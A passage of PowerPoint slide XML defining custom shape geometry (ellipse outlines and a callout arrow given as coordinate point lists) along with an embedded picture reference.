                    <a:pt x="160506" y="576793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148331" y="624138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136556" y="672999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125192" y="723337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114249" y="775111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103739" y="828279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93671" y="882801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84055" y="938638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74903" y="995747"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66225" y="1054089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58031" y="1113622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50331" y="1174307"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43136" y="1236102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36457" y="1298966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30304" y="1362860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24687" y="1427743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19617" y="1493573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15105" y="1560310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11160" y="1627915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7793" y="1696345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5015" y="1765560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2837" y="1835520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1267" y="1906184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="318" y="1977512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2049462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="318" y="2121412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1267" y="2192740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2837" y="2263404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5015" y="2333364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7793" y="2402580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11160" y="2471010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15105" y="2538614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19617" y="2605352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24687" y="2671182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30304" y="2736064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36457" y="2799958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43136" y="2862823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50331" y="2924618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58031" y="2985303"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66225" y="3044836"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74903" y="3103178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84055" y="3160287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93671" y="3216123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103739" y="3270646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114249" y="3323814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125192" y="3375588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136556" y="3425925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148331" y="3474787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160506" y="3522132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173071" y="3567919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186017" y="3612108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199331" y="3654658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213004" y="3695529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="227025" y="3734679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241384" y="3772069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256071" y="3807658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="286384" y="3873268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="317882" y="3931186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="350479" y="3981085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384094" y="4022640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="418642" y="4055527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="454040" y="4079420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="490203" y="4093995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527049" y="4098925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="545552" y="4097686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="600059" y="4079420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="635457" y="4055527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670005" y="4022640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="703619" y="3981085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="736217" y="3931186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="767715" y="3873268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="798028" y="3807658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="812715" y="3772069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="827074" y="3734679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="841095" y="3695529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="854768" y="3654658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="868082" y="3612108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881027" y="3567919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="893593" y="3522132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="905768" y="3474787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917543" y="3425925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="928907" y="3375588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="939849" y="3323814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950360" y="3270646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="960428" y="3216123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="970044" y="3160287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="979196" y="3103178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="987874" y="3044836"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="996068" y="2985303"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1003768" y="2924618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1010963" y="2862823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1017642" y="2799958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1023795" y="2736064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1029412" y="2671182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1034482" y="2605352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1038994" y="2538614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1042939" y="2471010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1046306" y="2402580"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1049084" y="2333364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1051262" y="2263404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1052832" y="2192740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1053781" y="2121412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1054100" y="2049462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1053781" y="1977512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1052832" y="1906184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1051262" y="1835520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1049084" y="1765560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1046306" y="1696345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1042939" y="1627915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1038994" y="1560310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1034482" y="1493573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1029412" y="1427743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1023795" y="1362860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1017642" y="1298966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1010963" y="1236102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1003768" y="1174307"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="996068" y="1113622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="987874" y="1054089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="979196" y="995747"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="970044" y="938638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="960428" y="882801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950360" y="828279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="939849" y="775111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="928907" y="723337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917543" y="672999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="905768" y="624138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="893593" y="576793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881027" y="531006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="868082" y="486817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="854768" y="444267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="841095" y="403396"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="827074" y="364245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="812715" y="326855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="798028" y="291267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="767715" y="225656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="736217" y="167739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="703619" y="117840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670005" y="76284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="635457" y="43398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="600059" y="19504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563895" y="4930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527049" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="C0C3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8" name="object 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="457200" y="1996920"/>
              <a:ext cx="1053720" cy="4098600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1053720"/>
                <a:gd name="textAreaRight" fmla="*/ 1054080 w 1053720"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 4098600"/>
                <a:gd name="textAreaBottom" fmla="*/ 4098960 h 4098600"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1054100" h="4098925" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="2049462"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="318" y="1977512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1267" y="1906184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2837" y="1835520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5015" y="1765560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7793" y="1696344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11160" y="1627914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15105" y="1560310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19617" y="1493573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24687" y="1427742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30304" y="1362860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36457" y="1298966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43136" y="1236101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50331" y="1174306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58031" y="1113622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66225" y="1054088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74903" y="995747"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84055" y="938637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93671" y="882801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103739" y="828279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114249" y="775110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125192" y="723337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136556" y="672999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148331" y="624138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160506" y="576793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173071" y="531006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186017" y="486817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199331" y="444267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213004" y="403396"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="227025" y="364245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241384" y="326855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256071" y="291267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="286384" y="225656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="317882" y="167739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="350479" y="117840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384094" y="76284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="418642" y="43397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="454040" y="19504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="490203" y="4930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527049" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="545552" y="1239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="600059" y="19504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="635457" y="43397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670005" y="76284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="703619" y="117840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="736217" y="167739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="767715" y="225656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="798028" y="291267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="812714" y="326855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="827074" y="364245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="841095" y="403396"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="854768" y="444267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="868082" y="486817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881027" y="531006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="893593" y="576793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="905768" y="624138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917543" y="672999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="928907" y="723337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="939849" y="775110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950360" y="828279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="960428" y="882801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="970043" y="938637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="979195" y="995747"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="987874" y="1054088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="996068" y="1113622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1003768" y="1174306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1010963" y="1236101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1017642" y="1298966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1023795" y="1362860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1029412" y="1427742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1034481" y="1493573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1038994" y="1560310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1042939" y="1627914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1046305" y="1696344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1049083" y="1765560"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1051262" y="1835520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1052831" y="1906184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1053781" y="1977512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1054099" y="2049462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1053781" y="2121412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1052831" y="2192740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1051262" y="2263404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1049083" y="2333364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1046305" y="2402579"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1042939" y="2471009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1038994" y="2538614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1034481" y="2605351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1029412" y="2671181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1023795" y="2736064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1017642" y="2799958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1010963" y="2862823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1003768" y="2924617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="996068" y="2985302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="987874" y="3044835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="979195" y="3103177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="970043" y="3160286"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="960428" y="3216123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950360" y="3270645"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="939849" y="3323813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="928907" y="3375587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917543" y="3425925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="905768" y="3474786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="893593" y="3522131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881027" y="3567918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="868082" y="3612107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="854768" y="3654657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="841095" y="3695528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="827074" y="3734678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="812714" y="3772068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="798028" y="3807657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="767715" y="3873267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="736217" y="3931185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="703619" y="3981084"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670005" y="4022639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="635457" y="4055526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="600059" y="4079420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563895" y="4093994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527049" y="4098924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="508546" y="4097685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="454040" y="4079420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="418642" y="4055526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384094" y="4022639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="350479" y="3981084"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="317882" y="3931185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="286384" y="3873267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256071" y="3807657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241384" y="3772068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="227025" y="3734678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213004" y="3695528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199331" y="3654657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186017" y="3612107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173071" y="3567918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160506" y="3522131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148331" y="3474786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136556" y="3425925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125192" y="3375587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114249" y="3323813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103739" y="3270645"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93671" y="3216123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84055" y="3160286"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74903" y="3103177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66225" y="3044835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58031" y="2985302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50331" y="2924617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43136" y="2862823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36457" y="2799958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30304" y="2736064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24687" y="2671181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19617" y="2605351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15105" y="2538614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11160" y="2471009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7793" y="2402579"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5015" y="2333364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2837" y="2263404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1267" y="2192740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="318" y="2121412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2049462"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="1269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779" name="object 11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80880" y="3200400"/>
              <a:ext cx="1130040" cy="742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0" name="object 12"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId5"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="533520" y="4116240"/>
              <a:ext cx="914040" cy="979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81" name="object 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1082880" y="2438280"/>
              <a:ext cx="5830920" cy="685440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 5830920"/>
                <a:gd name="textAreaRight" fmla="*/ 5831280 w 5830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5831205" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5830689" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="593528" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="593528" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="201707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="593528" y="285750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="593528" y="685800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5830689" y="685800"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="583068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2" name="object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1082880" y="2438280"/>
              <a:ext cx="5830920" cy="685440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 5830920"/>
                <a:gd name="textAreaRight" fmla="*/ 5831280 w 5830920"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 685440"/>
                <a:gd name="textAreaBottom" fmla="*/ 685800 h 685440"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="5831205" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="593527" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1466388" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2775678" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5830688" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5830688" y="114299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5830688" y="285749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5830688" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2775678" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1466388" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="593527" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
